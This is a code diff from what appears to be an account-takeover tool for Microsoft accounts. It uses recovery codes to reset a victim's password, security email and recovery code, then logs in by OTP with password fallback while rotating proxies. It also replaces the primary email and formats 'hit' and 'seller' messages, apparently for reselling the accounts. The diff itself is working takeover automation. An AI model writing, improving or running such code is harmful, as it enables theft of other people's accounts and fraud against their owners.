@@ -69,8 +69,8 @@ async def _secure_after_password_login(
 ) -> dict:
     """Finish securing using the new password (no OTP).
 
-    On MSAAUTH failure returns failed=True with fallback_otp=True so the caller
-    can retry via security-email OTP (the path users actually expect after recover).
+    Used as fallback when security-email OTP does not arrive after RecoverUser.
+    On MSAAUTH failure returns failed=True (no further OTP retry from here).
     """
     live = await livedata(session)
     page = await login_pwd(session, email, live["urlPost"], password, live["ppft"])
@@ -185,6 +185,7 @@ async def _secure_after_password_login(
     if reject:
         print(f"[X] - Rejected account: {reject}")
         logging.warning("Rejected secured account %s: %s", email, reject)
+        secured_ms = (secured or {}).get("microsoft") or {}
         return _failure_result(
             email,
             reject,
@@ -192,6 +193,7 @@ async def _secure_after_password_login(
             password=password,
             recovery_code=rextra.get("recovery_code"),
             credentials_changed=True,
+            primary_email=secured_ms.get("email"),
         )
 
     from securing.ban_checks import apply_ban_checks
@@ -200,6 +202,7 @@ async def _secure_after_password_login(
     if ban_reject:
         print(f"[X] - Banned account: {ban_reject}")
         logging.warning("Ban-check rejected %s: %s", email, ban_reject)
+        secured_ms = (secured or {}).get("microsoft") or {}
         return _failure_result(
             email,
             ban_reject,
@@ -207,6 +210,7 @@ async def _secure_after_password_login(
             password=password,
             recovery_code=rextra.get("recovery_code"),
             credentials_changed=True,
+            primary_email=secured_ms.get("email"),
         )
 
     account_id = uuid.uuid4().hex
@@ -225,12 +229,17 @@ def _failure_result(
     recovery_code: str | None = None,
     error: str | None = None,
     fallback_otp: bool = False,
+    fallback_password: bool = False,
     credentials_changed: bool = False,
+    primary_email: str | None = None,
 ) -> dict:
     # Only surface generated password/security email when RecoverUser actually succeeded
     # (or a later step failed after password change). Otherwise they mislead sellers.
+    # On give-back after primary replace, pass primary_email so sellers get sunny@.
+    current_primary = (primary_email or "").strip() or email
     if credentials_changed:
         ms = {
+            "email": current_primary,
             "security_email": security_email or "Couldn't Change!",
             "password": password or "Couldn't Change!",
             "recovery_code": recovery_code or "Couldn't Change!",
@@ -238,23 +247,18 @@ def _failure_result(
         }
     else:
         ms = {
+            "email": current_primary,
             "security_email": "Couldn't Change!",
             "password": "Couldn't Change!",
             "recovery_code": recovery_code or "Couldn't Change!",
             "original_email": email,
         }
     detail = error or reason
-    hit = build_failure_embed(
+    # Failure = account returned: include new primary when already changed.
+    # Success seller embeds still hide sunny (build_account_embeds).
+    fail_embed = build_failure_embed(
         email,
         ms,
-        reason,
-        error=detail,
-        credentials_changed=credentials_changed,
-    )
-    # Seller-facing copy always uses the submitted/original email (never sunny@).
-    seller = build_failure_embed(
-        email,
-        {**ms, "email": email},
         reason,
         error=detail,
         credentials_changed=credentials_changed,
@@ -264,10 +268,11 @@ def _failure_result(
         "reason": reason,
         "error": detail,
         "fallback_otp": fallback_otp,
+        "fallback_password": fallback_password,
         "credentials_changed": credentials_changed,
         "microsoft": ms,
-        "hit_embed": hit,
-        "seller_embed": seller,
+        "hit_embed": fail_embed,
+        "seller_embed": fail_embed,
     }
 
 
@@ -462,16 +467,112 @@ async def recovery_secure(
                     "recovery_code": new_recovery_code,
                 }
 
-                # Prefer password login when RecoverUser password stuck.
-                # Avoids OTP + fragile livedata parse when we already know the password works.
-                # If password login fails to establish MSAAUTH (passkey interrupt, rate-limit,
-                # etc.), fall back to security-email OTP — that is the path users expect.
+                # OTP-first after RecoverUser. Password login right after recover
+                # often triggers MS "unusual sign-in" / confirm interrupts that
+                # poison later SA elevation; security-email OTP usually does not.
+                # Password is the fallback when OTP mail does not arrive (30s).
                 account = None
-                if pwd_status == "ok":
-                    print("[~] - Logging in with new password (skip OTP)...")
-                    # Password verify leaves MSAAUTH cookies that make the next
-                    # login.live.com fetch return an empty 302 (no PPFT form).
-                    # Always start the real login on a clean session.
+                login_password = re.sub(
+                    r"\s*\(UNVERIFIED[^)]*\)\s*$", "", password or ""
+                ).strip()
+
+                async def _otp_login(s):
+                    info = await send_auth(s, email, security_email)
+                    flowtoken, auth_error = _flowtoken_from_auth(info)
+                    if auth_error:
+                        return _failure_result(
+                            email,
+                            auth_error,
+                            security_email=security_email,
+                            password=password,
+                            recovery_code=new_recovery_code,
+                            credentials_changed=True,
+                        )
+
+                    print("[~] - Getting email code (OTP-first, 30s)...")
+                    code = await get_email_code(security_email, timeout=30)
+                    print(f"Got code - {code}")
+
+                    if not code:
+                        return _failure_result(
+                            email,
+                            "Timed out waiting for OTP at the new security email.",
+                            security_email=security_email,
+                            password=password,
+                            recovery_code=new_recovery_code,
+                            credentials_changed=True,
+                            fallback_password=True,
+                        )
+
+                    live = await livedata(s)
+                    ppft = live["ppft"]
+
+                    return await startSecuringAccount(
+                        session=s,
+                        email=email,
+                        device=flowtoken,
+                        ppft=ppft,
+                        code=code,
+                        recovery=False,
+                        rextra=rextra,
+                        command=True,
+                    )
+
+                print("[~] - Logging in via security-email OTP (password is fallback)...")
+                await close_session(session)
+                session = get_session()
+
+                try:
+                    account, session = await run_with_proxy_retry(
+                        session,
+                        _otp_login,
+                        new_session=get_session,
+                        attempts=4,
+                        rotate_ssid_after=2,
+                        label="otp-login",
+                        email=email,
+                    )
+                except Exception as exc:
+                    if is_proxy_transport_error(exc):
+                        logging.warning(
+                            "otp path proxy exhausted for %s — falling back to password",
+                            email,
+                        )
+                        account = _failure_result(
+                            email,
+                            f"Network error during OTP login ({exc.__class__.__name__}).",
+                            security_email=security_email,
+                            password=password,
+                            recovery_code=new_recovery_code,
+                            error=str(exc) or exc.__class__.__name__,
+                            credentials_changed=True,
+                            fallback_password=True,
+                        )
+                        await close_session(session)
+                        session = get_session()
+                    else:
+                        raise
+
+                if (
+                    isinstance(account, dict)
+                    and account.get("failed")
+                    and account.get("fallback_password")
+                    and login_password
+                ):
+                    # Always try password after OTP timeout — verify can be flaky
+                    # (bad/unknown/UNVERIFIED) right after RecoverUser even when
+                    # the new password actually works.
+                    logging.warning(
+                        "OTP path failed for %s (%s) — falling back to password login"
+                        " (pwd_status=%s)",
+                        email,
+                        account.get("error") or account.get("reason"),
+                        pwd_status,
+                    )
+                    print(
+                        "[!] - Security-email OTP did not arrive in time; "
+                        f"falling back to password login (verify={pwd_status})..."
+                    )
                     await close_session(session)
                     session = get_session()
 
@@ -479,8 +580,8 @@ async def recovery_secure(
                         return await _secure_after_password_login(
                             s,
                             email,
-                            password,
-                            rextra,
+                            login_password,
+                            {**rextra, "password": login_password},
                             elapsed=time() - initialTime,
                         )
 
@@ -496,95 +597,10 @@ async def recovery_secure(
                         )
                     except Exception as exc:
                         if is_proxy_transport_error(exc):
-                            logging.warning(
-                                "password path proxy exhausted for %s — falling back to OTP",
-                                email,
-                            )
-                            account = None
-                            await close_session(session)
-                            session = get_session()
-                        else:
-                            raise
-
-                    if (
-                        isinstance(account, dict)
-                        and account.get("failed")
-                        and account.get("fallback_otp")
-                    ):
-                        logging.warning(
-                            "password path failed for %s (%s) — falling back to security-email OTP",
-                            email,
-                            account.get("error") or account.get("reason"),
-                        )
-                        print(
-                            "[!] - Password login did not establish MSAAUTH; "
-                            "falling back to security-email OTP..."
-                        )
-                        account = None
-                        await close_session(session)
-                        session = get_session()
-
-                if account is None:
-                    async def _otp_login(s):
-                        info = await send_auth(s, email, security_email)
-                        flowtoken, auth_error = _flowtoken_from_auth(info)
-                        if auth_error:
                             return _failure_result(
                                 email,
-                                auth_error,
-                                security_email=security_email,
-                                password=password,
-                                recovery_code=new_recovery_code,
-                                credentials_changed=True,
-                            )
-
-                        print(f"[~] - Getting email code...")
-                        # Mail can lag under bulk load; 150s matches i5600 wait.
-                        code = await get_email_code(security_email, timeout=150)
-                        print(f"Got code - {code}")
-
-                        if not code:
-                            return _failure_result(
-                                email,
-                                "Timed out waiting for OTP at the new security email.",
-                                security_email=security_email,
-                                password=password,
-                                recovery_code=new_recovery_code,
-                                credentials_changed=True,
-                            )
-
-                        live = await livedata(s)
-                        ppft = live["ppft"]
-
-                        return await startSecuringAccount(
-                            session=s,
-                            email=email,
-                            device=flowtoken,
-                            ppft=ppft,
-                            code=code,
-                            recovery=False,
-                            rextra=rextra,
-                            command=True,
-                        )
-
-                    # OTP fetch is inside the factory — only rotate SSID on connect
-                    # errors *before* a code is consumed when possible. After 2 proxy
-                    # fails we still rotate; a second OTP may be requested.
-                    try:
-                        account, session = await run_with_proxy_retry(
-                            session,
-                            _otp_login,
-                            new_session=get_session,
-                            attempts=4,
-                            rotate_ssid_after=2,
-                            label="otp-login",
-                            email=email,
-                        )
-                    except Exception as exc:
-                        if is_proxy_transport_error(exc):
-                            return _failure_result(
-                                email,
-                                f"Network error during OTP login ({exc.__class__.__name__}). "
+                                f"Network error during password login "
+                                f"({exc.__class__.__name__}). "
                                 "Credentials above are valid — retry securing.",
                                 security_email=security_email,
                                 password=password,
@@ -595,14 +611,32 @@ async def recovery_secure(
                         raise
 
                 if isinstance(account, dict) and account.get("failed"):
+                    # Keep reject embeds from startSecuringAccount (include sunny@ primary).
+                    # Re-wrapping via _failure_result without primary_email was wiping it.
+                    if account.get("hit_embed") or account.get("seller_embed"):
+                        ms = account.get("microsoft") or {}
+                        if not ms.get("security_email") and security_email:
+                            ms["security_email"] = security_email
+                        if not ms.get("password") and password:
+                            ms["password"] = password
+                        if not ms.get("recovery_code") and new_recovery_code:
+                            ms["recovery_code"] = new_recovery_code
+                        account["microsoft"] = ms
+                        account["credentials_changed"] = True
+                        return account
+                    ms = account.get("microsoft") or {}
                     return _failure_result(
                         email,
-                        account.get("reason", "Login or securing failed after recovery code reset."),
-                        security_email=security_email,
-                        password=password,
-                        recovery_code=new_recovery_code,
-                        error=account.get("reason"),
+                        account.get(
+                            "reason",
+                            "Login or securing failed after recovery code reset.",
+                        ),
+                        security_email=ms.get("security_email") or security_email,
+                        password=ms.get("password") or password,
+                        recovery_code=ms.get("recovery_code") or new_recovery_code,
+                        error=account.get("error") or account.get("reason"),
                         credentials_changed=True,
+                        primary_email=ms.get("email"),
                     )
 
                 if not account:
